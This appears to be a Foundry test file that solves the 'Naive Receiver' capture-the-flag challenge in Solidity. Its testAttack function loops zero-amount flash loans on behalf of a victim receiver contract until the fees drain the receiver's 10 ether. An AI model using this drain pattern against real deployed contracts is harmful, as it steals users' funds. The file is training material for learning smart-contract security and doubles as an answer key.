// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {NaiveReceiverLenderPool} from "../../src/naive-receiver/NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";

contract NaiveReceiverTest is Test {
    NaiveReceiverLenderPool public pool;
    FlashLoanReceiver public receiver;

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address player = makeAddr("player");
    uint256 public constant ATTACKER_INITIAL_BALANCE = 10 ether;
    uint256 public constant POOL_INITIAL_BALANCE = 1000 ether;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function setUp() public {
        pool = new NaiveReceiverLenderPool();
        vm.deal(address(pool), POOL_INITIAL_BALANCE);

        receiver = new FlashLoanReceiver(address(pool));
        vm.deal(address(receiver), ATTACKER_INITIAL_BALANCE);

        assertEq(address(pool).balance, POOL_INITIAL_BALANCE);
        assertEq(address(receiver).balance, ATTACKER_INITIAL_BALANCE);

        vm.expectRevert();
        receiver.onFlashLoan(address(this), ETH, ATTACKER_INITIAL_BALANCE, 1 ether, "");
        assertEq(address(receiver).balance, ATTACKER_INITIAL_BALANCE);
    }

    function testAttack() public {
        // Exploit code:
        vm.startPrank(player);
        uint256 bal = address(receiver).balance;
        while (bal >= 1 ether) {
            pool.flashLoan(receiver, ETH, 0, "");
            bal = address(receiver).balance;
        }
        vm.stopPrank();
        //
        validate();
    }

    function validate() public {
        assertEq(address(receiver).balance, 0);
        assertEq(address(pool).balance, POOL_INITIAL_BALANCE + ATTACKER_INITIAL_BALANCE);
    }
}
